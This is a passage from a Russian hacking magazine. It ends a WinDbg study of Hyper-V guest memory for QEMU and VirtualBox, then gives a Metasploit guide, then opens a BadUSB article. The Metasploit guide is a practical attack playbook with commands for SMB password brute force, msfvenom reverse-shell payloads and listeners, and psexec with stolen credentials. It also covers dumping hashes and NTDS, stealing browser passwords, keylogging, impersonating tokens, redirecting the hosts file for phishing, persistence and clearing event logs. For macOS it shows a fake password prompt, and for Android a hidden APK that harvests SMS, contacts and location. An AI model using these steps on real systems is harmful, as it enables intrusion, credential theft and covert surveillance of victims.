    [+0x000] Children         [Type: _RTL_BALANCED_NODE * [2]]
    [+0x000] Left             : 0xffffd883443a8e10 [Type:
_RTL_BALANCED_NODE *]
    [+0x008] Right            : 0xffffd88342f4a690 [Type:
_RTL_BALANCED_NODE *]
    [+0x010 ( 0: 0)] Red              : 0x0 [Type: unsigned char]
    [+0x010 ( 1: 0)] Balance          : 0x0 [Type: unsigned char]
    [+0x010] ParentValue      : 0x0 [Type: unsigned __int64]


2: kd> dx ‐id 0,0,ffffd8833e087040 ‐r1 ((ntkrnlmp!_RTL_BALANCED_NODE
*)0xffffd883443a8e10)
((ntkrnlmp!_RTL_BALANCED_NODE *)0xffffd883443a8e10)                 :
0xffffd883443a8e10 [Type: _RTL_BALANCED_NODE *]
    [+0x000] Children         [Type: _RTL_BALANCED_NODE * [2]]
    [+0x000] Left             : 0xffffd88344398490 [Type:
_RTL_BALANCED_NODE *]
    [+0x008] Right            : 0xffffd883443ae090 [Type:
_RTL_BALANCED_NODE *]
    [+0x010 ( 0: 0)] Red              : 0x1 [Type: unsigned char]
    [+0x010 ( 1: 0)] Balance          : 0x1 [Type: unsigned char]
    [+0x010] ParentValue      : 0xffffd883443b2891 [Type: unsigned
__int64]


2: kd> dx ‐id 0,0,ffffd8833e087040 ‐r1 ((ntkrnlmp!_RTL_BALANCED_NODE
*)0xffffd88344398490)
((ntkrnlmp!_RTL_BALANCED_NODE *)0xffffd88344398490)                 :
0xffffd88344398490 [Type: _RTL_BALANCED_NODE *]
    [+0x000] Children         [Type: _RTL_BALANCED_NODE * [2]]
    [+0x000] Left             : 0xffffd88348d75890 [Type:
_RTL_BALANCED_NODE *]
    [+0x008] Right            : 0xffffd88344398510 [Type:
_RTL_BALANCED_NODE *]
    [+0x010 ( 0: 0)] Red              : 0x0 [Type: unsigned char]
    [+0x010 ( 1: 0)] Balance          : 0x0 [Type: unsigned char]
    [+0x010] ParentValue      : 0xffffd883443a8e10 [Type: unsigned
__int64]

Нас в первую очередь интересу ет полезная нагрузка, содержащаяся в теле
листа дерева:


2: kd> dps  0xffffd88346564610
ffffd883`46564610  00000000`00000000
ffffd883`46564618  00000000`00000000
ffffd883`46564620  ffffd883`46564910
ffffd883`46564628  ffffd883`4802e558
ffffd883`46564630  ffffd883`4802e558
ffffd883`46564638  fffffc0f`022a73a0
ffffd883`46564640  fffffc0f`022a73a0
ffffd883`46564648  00000000`0000000e — Start GPA
ffffd883`46564650  00000000`0000009f — End GPA
ffffd883`46564658  ffffd883`44414000 — Prtn object
ffffd883`46564660  ffffd883`4802e530 — соответствующий элемент VPN‐
дерева
ffffd883`46564668  00000000`00000040
ffffd883`46564670  00000000`00000003
ffffd883`46564678  00000000`00000000


2: kd> dps 0xffffd8834802e530
ffffd883`4802e530  ffffd883`4802caa0
ffffd883`4802e538  ffffd883`4802f250
ffffd883`4802e540  ffffd883`4802f7a0
ffffd883`4802e548  00000000`281af2ee — start virtual page address
ffffd883`4802e550  00000000`281af37f — end virtual page address
ffffd883`4802e558  ffffd883`46564628
ffffd883`4802e560  ffffd883`46564628
ffffd883`4802e568  00000000`00000001





Для процесса QEMU можно увидеть, что базовый адрес региона памяти сов‐
падает с началом VPN‐бло ка:


2: kd> dps 0xffffad04c7872c10
ffffad04`c7872c10  00000000`00000000
ffffad04`c7872c18  ffffad04`cc1b7610
ffffad04`c7872c20  ffffad04`cc269610
ffffad04`c7872c28  ffffad04`c96a75b8
ffffad04`c7872c30  ffffad04`c96a75b8
ffffad04`c7872c38  ffffbf8d`0ef103a0
ffffad04`c7872c40  ffffbf8d`0ef103a0
ffffad04`c7872c48  00000000`00000000 — Start GPA
ffffad04`c7872c50  00000000`0000009f — End GPA
ffffad04`c7872c58  ffffad04`c8bd1000
ffffad04`c7872c60  ffffad04`c96a7590 — соответствующий элемент VPN‐
дерева
ffffad04`c7872c68  00000000`00000040
ffffad04`c7872c70  00000000`00000003
ffffad04`c7872c78  00000000`00000000


2: kd> dps ffffad04`c96a7590
ffffad04`c96a7590  ffffad04`ccb86120
ffffad04`c96a7598  ffffad04`c6cd8af0
ffffad04`c96a75a0  ffffad04`c6cd94a0
ffffad04`c96a75a8  00000000`0007fff0 — Start virtual page address
ffffad04`c96a75b0  00000000`0008008f — end virtual page address
ffffad04`c96a75b8  ffffad04`c7872c28
ffffad04`c96a75c0  ffffad04`c7872c28
ffffad04`c96a75c8  00000000`00000001
ffffad04`c96a75d0  53646156`02050000
ffffad04`c96a75d8  00000000`00000000
ffffad04`c96a75e0  00000000`00000000
ffffad04`c96a75e8  00000000`00000000





Чем‐то эта организация памяти напоминает обычное VAD‐дерево, которое
описывает адресное прос транство процесса, построенное на основе AVL‐
деревьев.  Также присутс тву ют минимальное и максимальное значение
диапазона блока памяти:


kd> dt ntkrnlmp!_MMVAD_SHORT
   +0x000 NextVad          : Ptr64 _MMVAD_SHORT
   +0x008 ExtraCreateInfo  : Ptr64 Void
   +0x000 VadNode          : _RTL_BALANCED_NODE
   +0x018 StartingVpn      : Uint4B
   +0x01c EndingVpn        : Uint4B
   +0x020 StartingVpnHigh  : UChar
   +0x021 EndingVpnHigh    : UChar
   +0x022 CommitChargeHigh : UChar
   +0x023 SpareNT64VadUChar : UChar
   +0x024 ReferenceCount   : Int4B
   +0x028 PushLock         : _EX_PUSH_LOCK
   +0x030 u                : <anonymous‐tag>
   +0x034 u1               : <anonymous‐tag>
   +0x038 EventList        : Ptr64 _MI_VAD_EVENT_BLOCK


kd> dt ntkrnlmp!_MMVAD
   +0x000 Core             : _MMVAD_SHORT
   +0x040 u2               : <anonymous‐tag>
   +0x048 Subsection       : Ptr64 _SUBSECTION
   +0x050 FirstPrototypePte : Ptr64 _MMPTE
   +0x058 LastContiguousPte : Ptr64 _MMPTE
   +0x060 ViewLinks        : _LIST_ENTRY
   +0x070 VadsProcess      : Ptr64 _EPROCESS
   +0x078 u4               : <anonymous‐tag>
   +0x080 FileObject       : Ptr64 _FILE_OBJECT


kd> dt ntkrnlmp!_MI_VAD_SEQUENTIAL_INFO
   +0x000 Length           : Pos 0, 12 Bits
   +0x000 Vpn              : Pos 12, 52 Bits

Таким образом, для чтения и записи в виртуальном адресном пространс тве
гостевой ОС, запущен ной в QEMU в режиме ускорения WHPX, сперва необ‐
ходимо сделать следующее.
 1. Транслировать виртуальный адрес  в физический  с помощью vid.
  dll!VidTranslateGvatoGpa.
 2. Найти необходимый GPN‐лист или узел в дереве, сравнивая начальный
   и конечный номера страниц с полученным физичес ким адре сом.
 3. Затем получить VPN‐элемент и узнать смещение блока памяти в адресном
   пространстве процес са qemusystemx86_64.exe или vmwarevmx.
  exe.
 4. Прочитать соответствующий блок памяти или выполнить запись (в зависи‐
  мости от операции).

Вариант 2 (теоретический, не требует kernel mode операций, но не проверял‐
ся).
 1. Транслировать адрес с помощью WHvTranslateGva из набора Windows
  HV Platform API.
 2. Просканировать  адресное  прос транство  процесса  qemusystem
  x86_64.exe или vmwarevmx.exe, найти блок, совпадающий размером
   с оперативной памятью (надеять ся, что он будет один и без фрагмента‐
   ции).
 3. Считать физический адрес смещением в блоке памяти процес са.
 4. Выполнить считывание или запись и надеяться, что повезет.

При запуске QEMU с параметрами


qemu‐system‐x86_64.exe ‐m 3072M ‐smp 1 ‐drive file= Win1020H1.gcow2,
index=0, media=disk, cache=writeback ‐accel whpx

в WinDbg можно снять трассу с помощью команды


bp winhvr!WinHvMapGpaPagesSpecial "r rcx, rdx,r8,r9;g"


2: kd> g
rcx=000000000000000c rdx=0000000000000000 r8=00000000000c0000 r9=
0000000000080400
rcx=000000000000000c rdx=00000000000fffc0 r8=0000000000000040 r9=
0000000000080400
...

Скриптом мы можем пос мотреть элементы деревь ев. Для QEMU результат
будет таким.





Размер блоков в гостевой ОС и размер блоков, описываемых VPN‐ и GPN‐
деревьями, примерно совпадает, но вполне может и отличаться, то есть вза‐
имно однозначного соответс твия между раз мером этих блоков нет.
  Для VirtualBox 6.1.8.





Несмотря на то что разработчики VirtualBox используют CreatePartition,
отображение памяти c помощью winhvr!WinHvMapGpaPagesSpecial они
не делают. Значительная часть эму ляции в VirtualBox выполняется в режиме
ядра, а производительность user mode WHPX недостаточна для нормального
функционирования под системы виртуализации. За развитием темы поддер‐
жки Hyper‐V можно наблюдать на официальном форуме VirtualBox.
  Основная подсистема, работающая с Hyper‐V, описана в этом файле. При‐
мер использования API можно увидеть в приложении‐трассировщике Sim‐
pleator.
  После добавления это го алго ритма в LiveCloudKd появилась возможность
читать память всех раз делов, созданных с помощью WHVP API. Операция
записи реализуется тем же способом, только с одним отличием — данные
копируются в адресное пространство процесса vmmem по найденному сме‐
щению.





Организация памяти для Windows 10 1803 подобна модели, сделанной
для контейнеров Windows Defender Application Guard  / Windows Sandbox
или контейнеров Docker, запущенных в режиме изо ляции Hyper‐V.





Google Android emulator (тот же QEMU).





ЗАКЛЮЧЕНИЕ
В целом можно сказать, что часть эмуляторов успешно работают на WHVP API
(QEMU, Android emulator), а часть так и не смог ла перейти на них полноценно
(VirtualBox, VMware). Microsoft явно не стремится упрощать жизнь конкурен‐
тным продуктам, хотя пря мой выгоды для них в этом не прос леживается. Про‐
изводительность вир туальных операционных систем, работающих с этими
API, также пока вызывает вопросы.
ВЗЛОМ





                                                RalfHacker
                                                hackerralf8@gmail.com

   ПУТЕВОДИТЕЛЬ ПО
METASPLOIT

            РАЗБИРАЕМ
     ПРИМЕРЫ ИСПОЛЬЗОВАНИЯ
     ЗНАМЕНИТОГО ФРЕЙМВОРКА





Metasploit Framework — самый масштабный и распиаренный
из всех фреймворков для эксплуатации и постэксплуатации.
Даже если ты не используешь его сам, то наверняка встре‐
чал немало упоминаний MSF в наших статьях. Однако ввод‐
ной статьи по нему в «Хакере» не было, а если и была, то так
давно, что не считается. Я попробую начать с самого начала,
а заодно рас скажу, как именно этот фреймворк использует
моя команда, и дам разные практические советы.


           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный информацией из этой статьи.



УСТАНОВКА METASPLOIT FRAMEWORK
В дистрибутивах, предназначенных для тес тирования на проникновение (к
примеру, Kali или Parrot OS), этот продукт либо предус тановлен, либо легко
устанавливается следующей командой:


apt install metasploit‐framework

Если же ты хочешь использовать Metasploit Framework, например, в Ubuntu, то
его можно установить из официального репози тория. Для этого набери
в консоли следующие директивы:


curl https://raw.githubusercontent.com/rapid7/metasploit‐omnibus/mas‐
ter/config/templates/metasploit‐framework‐wrappers/msfupdate.erb >
msfinstall
sudo chmod 755 msfinstall
sudo ./msfinstall


База данных Metasploit
Довольно часто пользователям Metasploit приходится ломать сети, содер‐
жащие очень много хостов. И нас тупа ет момент, когда аккумулирование всей
полученной информации занимает непозволительно долгое вре мя. Именно
тогда начинаешь ценить возможность работы Metasploit Framework с СУБД
PostgreSQL.  Metasploit может сам  сохранять и удобно формализовать
полученную информацию благодаря модулю msfdb. Для работы с базами
необходимо запустить службу postgresql и соз дать базу для Metasploit.


service postgresql start
msfdb init





        Сообщение msfdb об успешном создании базы данных

Проверить подключение к базе данных можно из самого фреймворка, выпол‐
нив команду db_status.


             Успешное подклю чение к базе данных Metasploit

Чтобы было удобней работать с раз личны ми областями (хостами, сетями
или доменами) и разделять данные для структуризации, msfdb име ет поддер‐
жку так называемого рабочего прос транства. Давай добавим новое прос‐
транство в наш проект.


> workspace ‐a xakep





              Создание нового рабочего прос транства

Теперь мы действуем в созданном рабочем прос транстве. Пред ставим, что
мы находимся в сети 192.168.6.0.24. Давай поищем в ней доступные хосты.
Для этого будем исполь зовать Nmap, но из Metasploit и с привяз кой к текущей
базе данных — db_nmap.


> db_nmap ‐O 192.168.6.0/24

Сам вывод Nmap нам неинтересен: все, что нужно, будет сохранено в базе
данных. К примеру, у нас есть уже все просканиро ванные хосты и мы можем
их просмотреть одним списком с помощью команды hosts.





      Список просканиро ванных хостов, сохраненный в базе данных

Но заодно с хостами были сохранены и все службы, спи сок которых у нас
теперь также всегда будет под рукой. При этом мы можем посмотреть
как вообще все службы на портах, так и спи сок служб для определенного хос‐
та.





                  Список всех найденных служб





           Список найденных на определен ном хосте служб

У базы данных msfdb есть очень кру тая воз можность — сохранение всех най‐
денных учетных данных. Об этой функции я рас скажу позже, а сначала нес‐
колько слов о возможностях брутфорса, которыми располагает фреймворк.
Полный список перебираемой информа ции для коллекционирования учетных
данных можно получить следующей командой:


> search type auxiliary/scanner ‐S "_login"





       Модули для брут форса учетных данных некоторых служб

Обрати внимание на SMB. Чтобы узнать, для чего именно предназначен
определенный модуль и его описание (со ссылкой на cvedetails), а также пос‐
мотреть данные, которые нужно передать в качестве параметров, следует
воспользоваться командой info.


info auxiliary/scanner/smb/smb_login





                  Описание модуля smb_login

Давай выберем этот модуль, зададим наз вание домена, имя пользователя,
интересующий нас хост и список паролей.


msf5 > use auxiliary/scanner/smb/smb_login
msf5 auxiliary( scanner/smb/smb_login) > set RHOSTS 192.168.6.129
msf5 auxiliary( scanner/smb/smb_login) > set SMBUser root
msf5 auxiliary( scanner/smb/smb_login) > set PASS_FILE
/home/ralf/tmp/pass.txt
msf5 auxiliary( scanner/smb/smb_login) > set SMBDomain DOMAIN
msf5 auxiliary( scanner/smb/smb_login) > run





                   Нас трой ка модуля smb_login





      Обнаруженный smb_login пароль для целево го пользователя

Если найденный пользователь — администра тор, Metasploit сообщит нам
об этом, что очень удобно. Но ведь в нашей сети может быть 100 машин
и даже больше, а на них наверняка запущено множество служб. Как правило,
удается собрать много учетных данных, исполь зуя только модули брутфорса.
Использование msfdb поз воляет не тра тить время на коллекциони рование
всех обнаруженных логинов, хешей, паролей, так как они автоматически оста‐
ются в хранилище учетных данных, посмотреть которое можно командой
creds.





                   Хранилище учет ных данных msfdb

Я описал не все функции msfdb (есть интеграции со сканерами Nessus
и OpenVAS), а лишь те, которыми постоянно пользует ся наша команда.


ПОЛУЧЕНИЕ ТОЧКИ ОПОРЫ
Полезная нагрузка
Metasploit предоставляет большой арсенал воз можностей для создания
полезной нагрузки. Но нужно учитывать, что сущес твуют раз ные способы
внедрения этой самой наг рузки. С помощью фреймворка можно создавать
как легкие пейлоады для выполнения команд и получения простого шелла, так
и сложные, например meterpreter или VNC (с исполь зовани ем дополнитель‐
ного загрузчика).
  При этом одна и та же полезная наг рузка может работать как в режиме
ожидания подключения  (bind), так и в режиме reverse (для бэкконнекта
от целевого хоста). Сто ит учитывать, что чем легче нагрузка, тем больше ее
надежность  и  стабиль ность.  Так,  обычный шелл  может  быть  создан
с помощью AWK, jjs, Lua, Netcat, Node.js, Perl, R, Ruby, socat, stub, zsh, ksh,
Python, PHP, PowerShell.
   Чтобы найти нагрузку для определен ного случая, используем команду
search.


search payload/





            Некото рые виды полезной нагрузки Metasploit

В большинстве случаев используется заг рузчик в одном из следующих фор‐
матов: raw, ruby, rb, perl, pl, c, js_be, js_le, java, dll, exe, exe‐small, elf, macho,
vba, vbs, loop‐vbs, asp, war. Для работы с пейлоада ми в сос таве фреймворка
имеется свой модуль — msfvenom.
  Давай для примера создадим нагрузку meterpreter типа reverse, работа‐
ющую по протоколу TCP для операционной сис темы Windows, — это win‐
dows/x64/meterpreter/reverse_tcp.





        Описание нагрузки windows/x64/meterpreter/reverse_tcp

Главными параметрами для этой полезной наг рузки будут LHOST и LPORT —
адрес и порт нашего сервера для бэкконнекта. Создадим нагрузку в формате
*.exe.


msfvenom ‐p [ пейлоад] [ параметры пейлоада] ‐f [ формат] ‐o [ итоговый
файл]





              Создание наг рузки с помощью msfvenom

Исполняемый файл с нагрузкой готов. Да, у msfvenom есть еще много фун‐
кций вроде задержек и кодеров, но наша команда их не использует.


Листенер
За создание листенера отвечает модуль exploit/multi/handler. Этому
модулю нужно указать только целевой пей лоад, с которым он будет взаимо‐
действовать, и параметры это го пейлоада.


> use exploit/multi/handler
> set payload windows/x64/meterpreter/reverse_tcp
> set LHOST 192.168.6.1
> set LPORT 4321
> run





                      Создание лис тенера

Есть быстрый способ соз дать такой листенер — команда укладывается в одну
строку.


handler ‐p [ пейлоад] ‐H [ хост] ‐P [ порт]




                      Создание лис тенера

И теперь наша задача сделать так, чтобы файл с нагрузкой был выпол нен
на целевом хосте.


Эксплоиты
Об используемых нами экспло итах в обертке Metasploit Framework я рас скажу
кратко, так как для получения точки опоры мы исполь зуем только два из них.
Это     exploit/windows/smb/psexec     и     exploit/windows/smb/
ms17_010_eternalblue. Конечно, если нам уда ется обнаружить уязвимые
службы и для них есть экс плоиты в Metasploit, они тоже идут в дело, но такое
случается редко. В следующих разделах мы чуть подробнее разберем имен‐
но нагрузку meterpreter, так как легкие нагрузки обес печивают доступ к обыч‐
ному шеллу,  а  vncinject  просто  открывает  удаленный  рабочий  стол.
Для модуля psexec укажем полученные учетные данные, адрес целевого хоста
и тип нагрузки с необ ходимыми параметрами.


> use exploit/windows/smb/psexec


> set payload windows/x64/meterpreter/reverse_tcp
> set LHOST 192.168.6.1
> set LPORT 9876


> set RHOSTS 192.168.6.129
> set SMBUser root
> set SMBPass 1q2w#E$R
> set SMBDomain domain.dom
> run





                 Получение сес сии meterpreter

В итоге мы получаем сессию meterpreter для уда ленного хоста с операци‐
онной системой Windows.


ЭКСПЛУАТАЦИЯ И ПОСТЭКСПЛУАТАЦИЯ
Настало время уделить внимание вопросам эксплу атации тех возможностей,
которые мы получили на предыду щем этапе. Удаленный хост может работать
под управлением различных операционных систем, поэтому поговорим
о каждой из них в отдельнос ти.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

    ПУТЕВОДИТЕЛЬ ПО
         METASPLOIT
            РАЗБИРАЕМ ПРИМЕРЫ ИСПОЛЬЗОВАНИЯ
                    ЗНАМЕНИТОГО ФРЕЙМВОРКА





Windows
Эта ОС — одна из самых распростра ненных, поэтому постэкс плуатацию
узлов, работающих под управлением Windows, можно условно разделить
на несколько подходов.


База meterpreter
Сначала давай расскажу о модулях, которые мы используем, когда у нас уже
имеется сессия  meterpreter. Как и во множестве дру гих фреймворков,
в Metasploit присутствуют полезные команды для загрузки файлов download
и upload. Для стабильности мы можем перенести нашу сессию в дру гой про‐
цесс на хосте с помощью команды migrate. Эта команда принимает один
параметр — PID целево го процесса, получить который можно из списка про‐
цессов (с помощью команды ps).





                 Мигрирование в другой процесс

Также мы можем создавать свои процес сы. Для этого нужно указать лишь
файл  (‐f) и при желании включить интерактивный  (‐i) или скрытый  (‐H)
режимы.


execute ‐f cmd.exe ‐i ‐H





               Создание скрытого про цес са cmd.exe

Кстати, проблема кодировки реша ется с помощью команды cp  65001.
Опция, используемая почти всегда, — переход в контекст SYSTEM. Для этого
нужно просто выпол нить команду getsystem.



                  Переход в контекст SYSTEM

Очень полезна функция поиска файлов, если тебе нужно найти на удаленной
машине документы или архивы.





                    Поиск всех файлов TXT

Еще можно выпол нить на взло манном хосте команду PowerShell или Python,
а также загрузить PS1‐файл или скрипт на Python в память. Для этого сначала
запусти нужные модули, а потом выбери соот ветс твующую команду.



                   Модуль PowerShell



                    Модуль Python


Туннели
Одна из самых крутых воз можнос тей Metasploit — соз дание туннелей. Мы
можем использовать захваченный хост как мост между внешней и внутренней
сетью. Обычно  сначала проверя ют,  есть  ли допол нительные  сетевые
интерфейсы.


> ifconfig





                Получение адреса внутренней сети

Для обнаружения хостов мы можем посмотреть таблицу ARP.


> arp





                     ARP‐таблица целевого хос та

Теперь нам необ ходимо построить туннель. Сна чала создадим маршрут
и проверим его с помощью autoroute.


> run autoroute ‐s 10.0.0.0/24
> run autoroute ‐p





                      Создание маршрута





                  Список созданных маршрутов

Теперь отправим сессию в фоновый режим, тем самым перейдя из оболочки
meterpreter в оболочку msf.


> background



                   Переход в фоновый режим

На следующем этапе нам нужно настроить SOCKS‐прокси‐сервер. За это
отвечает модуль auxiliary/server/socks4a. В качестве параметров он
принимает хост и порт (по умолчанию — localhost:1080).


> use auxiliary/server/socks4a
> run




                Создание SOCKS4‐прокси‐сервера

Чтобы вернуться обратно в обо лочку meterpreter, можно воспользоваться
командой sessions и указать номер сессии.



                   Переход в фоновый режим

В качестве редиректора мы можем использовать ProxyChains. Для этого ука‐
жем адрес созданного нами прокси‐сервера в фай ле конфигурации /etc/
proxychains.conf.




                 Файл кон фигура ции ProxyChains

Теперь просканируем с помощью Nmap и созданного туннеля найденный
в ARP‐таблице хост.


# proxychains ‐q nmap 10.0.0.5





  Сканирование пор тов хоста во внутренней сети через туннель Metasploit


Сбор учетных данных
Сбор паролей и хешей — неотъемлемая часть любой атаки, и Metasploit поз‐
воляет это делать легко и неп ринуж денно. Первый метод — воспользоваться
командой hashdump, которая собирает хеши из фай ла SAM.





                 Использование опции hashdump

Если мы имеем доступ к контроллеру домена, то можем очень легко сдампить
файл NTDS.DIT (что это за файл и зачем он нужен, под робно рас сказывалось
вот в этой статье).


> use post/windows/gather/ntds_grabber
> set SESSION 5
> run





                 Использование опции hashdump

При этом мы можем получать пароли из групповой политики и MS SQL бла‐
годаря модулям post/windows/gather/credentials/gpp, а также сохранен‐
ные пароли Skype, TeamViewer и Outlook  (post/windows/gather/creden‐
tials/outlook, post/windows/gather/credentials/skype, post/windows/
gather/credentials/teamviewer_passwords). Ну и конечно же, я не могу
оставить без внимания браузеры, из которых мы получаем не только учетные
данные, но еще и файлы куки, и историю прос мотра веб‐страниц.


> use post/windows/gather/enum_chrome
> set session 5
> run





                 Получение данных из бра узера

Все эти файлы сох ранятся в базе msfdb, и к ним всегда можно получить дос‐
туп, выполнив команду loot.





                       Результат loot msfdb

На самом деле файлы не текстовые. Они представляют собой базу данных
SQLite, но вот сохраненные пароли мы находим без особого тру да.





               Сохраненные учет ные данные в бра узе ре

И завершим раздел про учетные данные, упо мянув интеграцию Metasploit
с mimikatz. Для этого загрузим соответству ющий модуль.





                    Заг рузка модуля KIWI и mimikatz

О mimikatz я подробно рас сказывать не буду — этот инс трумент известен,
наверное, всем читателям. В Metasploit интегрированы следующие модули,
которые можно исполь зовать по мере необходимости.





                    Модули mimikatz


Разведка
Про разведку в домене я рас скажу вкратце. Команд для этой цели имеется
великое множество, их можно найти по пути post/windows/gather/. В пер‐
вую очередь нас интересу ет получение спис ка пользователей домена
(enum_ad_users),  всех  групп    (enum_ad_groups),  зарегистрированных
в домене компьюте ров  (enum_ad_computers), а  также общих ресурсов
(enum_shares). К более масштабным методам разведки в домене я отнесу
модуль  post/windows/gather/bloodhound,  использующий  одноименный
инструмент.
   Иногда для поиска вектора LPE необходимо изу чить установленное
на удаленных машинах ПО. Metasploit способен облегчить и эту задачу.





                   Список уста новленного ПО

Не мешает лишний раз про верить наличие каких‐нибудь CVE для повышения
привилегий. За их перечисление отвечает модуль post/multi/recon/lo‐
cal_exploit_suggester. Вот пример найденной этим модулем уязвимости.





                   Проверка LPE‐эксплоитов

Иногда полезно собирать и анализировать трафик. Сначала нам нужно заг‐
рузить модуль sniffer и изучить доступные сетевые интерфейсы.





                        Заг рузка модуля sniﬀer

Теперь следует активировать сниффер на определенном интерфейсе и ука‐
зать файл, в который мы будем собирать трафик. Пос ле окончания сбора
данных нужно будет завер шить процесс прослушивания интерфейса.





                        Запись трафика

И не оставим без внимания воз можности кей логгера. Команды start, dump
и stop аналогичны уже рассмотренным выше.





                     Запись нажатия клавиш


Обеспечение доступа
Для обеспечения доступа в Metasploit предус мотрено множество крутых инс‐
трументов. Начнем с токенов доступа, которые позволя ют нам выдать себя
за других пользователей. Для начала загрузим модуль incognito и пос‐
мотрим, какие токены есть в системе.


> load incognito
> list_tokens ‐u





                       Заг рузка модуля incognito

Судя по результатам обработки команды, мы можем войти в контекст поль‐
зователя MediaAdmin$. Давай сделаем это.


impersonate_token DOMAIN\\ MediaAdmin$




                     Запись нажатия клавиш

И вот мы уже работаем от его имени! Выполнением программ на C# в памяти
уже никого не удивить, поэто му ска жу лишь, что это делается с помощью
post/windows/manage/execute_dotnet_assembly.
   Если мы заметим, что пользователь час то обра щается к какому‐то сайту
по доменному имени, мы можем сделать копию стра ницы авторизации этого
сайта и подменить его адрес в файле hosts.


run hostsedit ‐e 192.168.6.1,www.microsoft.com

Таким образом пользователь при обращении к www.microsoft.com будет
попадать на наш сервер. При необ ходимости можно быстро установить
на хост Python или SSH‐сервер, для чего нам понадобятся следующие
модули: post/windows/manage/install_python и post/windows/manage/
install_ssh.





           Быстрая уста новка Python и SSH на целевой хост

Так же как и в Empire, мы можем включить RDP и изменить настройки фай рво‐
ла с помощью модуля post/windows/manage/enable_rdp.





                 Включение RDP на целевом хосте

Не секрет, что, если в момент атаки компь ютер будет перезагружен, мы
потеряем текущую сессию, поэто му важно на всякий случай закрепиться
в системе. Тут все просто: можно использовать любой метод, который тебе
по нраву (мы юзаем опцию ‐S).





                Модуль сохранения доступа





                       Закрепление в системе

Напоследок нужно зачис тить следы. Наша команда использует для этого воз‐
можности модуля clearev.



           Очистка логов в журналах событий и безопас ности

Вот так и проходят атаки на Windows‐машины.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

    ПУТЕВОДИТЕЛЬ ПО
         METASPLOIT
            РАЗБИРАЕМ ПРИМЕРЫ ИСПОЛЬЗОВАНИЯ
                    ЗНАМЕНИТОГО ФРЕЙМВОРКА





macOS
Технология атак на компь ютеры под управлением macOS уже подробно рас‐
сматривалась в статье, посвященной фреймворку Empire. Поэтому не станем
останавливаться на теории и сразу перейдем к практике. Нам нужно создать
нагрузку в формате macho и запус тить для нее листенер.





                Генерируем нагрузку в формате macho



          Создание лис тенера для сгенерированной нагрузки

После выполнения полез ной нагрузки сразу проверим версию операци онной
системы.





     Подклю чение агента и про верка версии операционной системы

Теперь, когда мы знаем, с чем имеем дело, нам нужно перечислить важные
файлы. В этом нам поможет модуль enum_osx, который запишет в журнал
собранную информацию.


run post/osx/gather/enum_osx





                Собранная enum_osx информация

Когда имеешь дело с маками, приходится по максимуму использовать при‐
емы социальной инженерии. Например, с помощью password_prompt_spoof
мы можем показать пользователю вот такое окош ко.





                     Окно запроса пароля

Можно сколько угодно нажимать Cancel: это совершенно бесполезно, потому
что окно будет открывать ся заново, пока юзер не введет пароль.


run osx/gather/password_prompt_spoof





  Получение пароля поль зователя с помощью модуля
  password_prompt_spoof

За работу кейлоггера отвечает модуль osx/capture/keylog_recorder, а за
получение хешей — osx/gather/hashdump. Наб людать за работой этих инс‐
трументов удобнее всего с помощью команды screenshare.





                   Запись экра на пользователя


Linux
Схема атаки на машины под управлением ОС Linux в целом такая же, как при
работе с Windows и macOS. Сначала сгенерируем нагрузку, а затем запустим
листенер и посмотрим информацию о системе.





                         Генера ция нагрузки




          Создание лис тенера для сгенерированной нагрузки





     Подклю чение агента и про верка версии операционной системы

Поскольку разведка обычно проводится с помощью скриптов вроде LinPEAS,
то Metasploit оставляет нам не так уж много воз можнос тей. Тем не менее
один модуль  запускается  всегда — local_exploit_suggester. С  его
помощью мы можем прос мотреть эксплоиты для повыше ния привилегий.




               Перечисление воз можных эксплоитов

Еще один легкий, но приятный модуль уже для сохранения доступа — linux/
manage/sshkey_persistence. Этот модуль запишет свой SSH‐ключ, бла‐
годаря чему мы сможем в любой момент вос ста новить утраченный дос туп
к системе. Следует отметить, что скрип ты перечис ления не проверяют про‐
фили браузеров, мы это делаем с помощью firefox_creds.




                       Профили Firefox

И пос ледний полезный модуль — linux/manage/iptables_removal. С его
помощью очень, очень удоб но уда лять пра вила файрвола.




                      Уда ление пра вил iptables


Android
С девайса под управлением Android можно вытащить много интересной
информации. Эта обширная тема тянет на отдель ную заметку, поэтому здесь
мы разберем несколько прикольных фишек, которые предоставля ет для дан‐
ной платформы meterpreter. Давай соберем наг рузку для Android с помощью
msfvenom.


msfvenom ‐p android/meterpreter/reverse_tcp LHOST= 192.168.43.116
LPORT= 4321 ‐o 1.apk





              Создание meterpreter‐нагрузки для Android

Теперь активируем листенер.


handler ‐p android/meterpreter/reverse_tcp ‐H 192.168.43.116 ‐P 4321





                         Активация листенера

Затем любым удоб ным способом доставим соз данный нами .apk‐файл
на целевое устрой ство и выполним его. Приложение запус тится в фоновом
режиме, и пользователь не заметит ничего подоз рительного.





              Подключение агента и про верка системы

Первым делом скроем значок своего приложения командой hide_app_icon,
чтобы оно не отоб ражалось в меню пользователя. Также сразу полезно
узнать, рутован ли смартфон, — для этого исполь зуется тулза check_root.


           Проверка смартфона на наличие root‐привилегий

Используемый нами инстру ментарий поз воля ет  устанавливать,  удалять,
просматривать установленные прог раммы и запус кать приложения. Нап‐
ример, я поудалял на смартфоне все программы от производителя. Сделать
это можно с помощью следующих команд:
 • app_list
 • app_install
 • app_uninstall
 • app_run





                    Результат команды app_list

Также мы можем получить все контакты, список вызовов и SMS благодаря
модулям dump_contacts, dump_calllog, dump_sms. Но самая крутая фиш‐
ка — следить за перемещением пользователя смартфона при помощи
модуля geolocate.




                Получение коор динат смартфона





          Определение местополо жения на картах Google


ЗАКЛЮЧЕНИЕ
Как видишь, Metasploit намного более уни вер саль ный, чем другие фреймвор‐
ки, поэтому сравнивать его с конкурентами очень непросто. Это один из инс‐
трументов, о возможнос тях которых нужно как минимум знать. Наде юсь, эта
статья помогла тебе в их освоении.


        WWW

                      Больше информации — в моем канале в «Телег‐
                      раме»  @RalfHackerChannel. Здесь ты можешь
                        задать интересующие тебя воп росы или помочь
                       другим.
ВЗЛОМ
   УТИНЫЕ
   ИСТОРИИ





        ДЕЛАЕМ СВОЙ АНАЛОГ
           RUBBER DUCKY
     С БЕСПРОВОДНОЙ СВЯЗЬЮ





Есть такой вектор атак, как BadUSB, — его
суть заключается в эмуляции работы кла‐
виатуры и выполнении операций на компь‐
ютере под видом обычного вво да от поль‐
зователя.   Клавиатура   чаще    всего            Candidum                                                                                               duospirit@gmail.com
